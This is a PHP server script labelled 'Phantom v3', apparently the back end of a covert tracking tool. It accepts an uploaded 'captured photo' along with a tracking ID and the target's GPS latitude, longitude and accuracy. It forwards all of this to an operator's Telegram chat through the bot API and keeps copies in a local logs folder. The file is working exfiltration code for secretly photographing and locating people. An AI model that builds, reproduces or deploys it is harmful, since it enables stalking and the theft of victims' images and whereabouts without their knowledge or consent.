<?php
/**
 * Phantom v3 – Receive captured photo and send to Telegram
 */

$config = require __DIR__ . '/config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

$trackId = isset($_POST['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['id']) : '';
$lat     = $_POST['lat'] ?? '';
$lon     = $_POST['lon'] ?? '';
$acc     = $_POST['accuracy'] ?? '';

if (empty($trackId) || empty($_FILES['photo'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing data']);
    exit;
}

$photo = $_FILES['photo'];

// Basic validation
if ($photo['error'] !== UPLOAD_ERR_OK || $photo['size'] > 5 * 1024 * 1024) {
    http_response_code(400);
    exit;
}

// ===== Send to Telegram =====
$token = $config['telegram']['bot_token'] ?? '';
$chat  = $config['telegram']['chat_id'] ?? '';

if ($token && $chat) {
    $caption  = "📸 <b>Photo Captured</b>\n";
    $caption .= "ID: <code>{$trackId}</code>\n";
    if ($lat && $lon) {
        $caption .= "📍 {$lat}, {$lon}";
        if ($acc) $caption .= " (±{$acc}m)";
    }

    $url = "https://api.telegram.org/bot{$token}/sendPhoto";

    $post = [
        'chat_id'    => $chat,
        'caption'    => $caption,
        'parse_mode' => 'HTML',
        'photo'      => new CURLFile($photo['tmp_name'], 'image/jpeg', 'capture.jpg')
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $post,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Optional: save a copy locally
$saveDir = __DIR__ . '/logs/photos';
if (!is_dir($saveDir)) {
    mkdir($saveDir, 0755, true);
}
$filename = $saveDir . '/' . $trackId . '_' . time() . '.jpg';
move_uploaded_file($photo['tmp_name'], $filename);

header('Content-Type: application/json');
echo json_encode(['ok' => true]);
